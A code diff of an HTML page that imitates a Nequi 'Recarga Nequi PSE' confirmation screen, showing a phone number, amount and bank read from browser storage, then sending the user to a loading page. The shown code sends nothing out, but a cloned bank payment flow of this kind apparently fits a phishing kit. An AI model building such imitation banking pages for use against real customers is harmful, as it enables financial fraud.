@@ -12,53 +12,57 @@
 
 <div class="container">
 
-    <img src="logo.svg" class="logo" alt="Nequi">
-    <h2 class="title">Revisa la info</h2>
+<img src="logo.svg" class="logo">
 
-    <div class="card">
+<h2 class="title">Revisa la info</h2>
 
-        <p class="label">Concepto</p>
-        <p>Recarga Nequi PSE</p>
+<div class="card">
 
-        <p class="label">Número de celular</p>
-        <p id="telefono"></p>
+<p class="label">Concepto</p>
+<p>Recarga Nequi PSE</p>
 
-        <p class="label">¿Cuánto?</p>
-        <p id="monto"></p>
+<p class="label">Número de celular</p>
+<p id="telefono"></p>
 
-        <p class="label">Tipo de persona</p>
-        <p id="persona"></p>
+<p class="label">¿Cuánto?</p>
+<p id="monto"></p>
 
-        <p class="label">Banco</p>
-        <p id="banco"></p>
+<p class="label">Tipo de persona</p>
+<p id="persona"></p>
 
-    </div>
+<p class="label">Banco</p>
+<p id="banco"></p>
 
-    <button class="btn active" id="recargarBtn">Recargar</button>
-    <button class="btn-outline" onclick="history.back()">Atrás</button>
+</div>
+
+<button class="btn active" id="recargarBtn">Recargar</button>
+<button class="btn-outline" id="btnAtras">Atrás</button>
 
 </div>
 
 <script>
-// cargar datos
-document.getElementById("telefono").innerText = localStorage.getItem("telefono");
-document.getElementById("monto").innerText = "$ " + localStorage.getItem("monto");
-document.getElementById("persona").innerText = localStorage.getItem("persona");
-document.getElementById("banco").innerText = localStorage.getItem("banco");
-
+const telefono = localStorage.getItem("telefono") || "";
+const monto = localStorage.getItem("monto") || "";
+const persona = localStorage.getItem("persona") || "";
+const banco = localStorage.getItem("banco") || "";
 
 function formatear(num) {
-    return num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+return num.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
 }
 
-let monto = localStorage.getItem("monto");
-document.getElementById("monto").innerText = "$ " + formatear(monto);
-</script>
+document.getElementById("telefono").innerText = telefono;
+document.getElementById("monto").innerText = monto ? "$" + formatear(monto) : "";
+document.getElementById("persona").innerText = persona;
+document.getElementById("banco").innerText = banco;
 
-<script>
 document.getElementById("recargarBtn").addEventListener("click", () => {
-    window.location.href = "loading.html";
+window.location.href = "loading.html";
+});
+
+document.getElementById("btnAtras").addEventListener("click", () => {
+history.back();
 });
 </script>
+
 </body>
 </html>
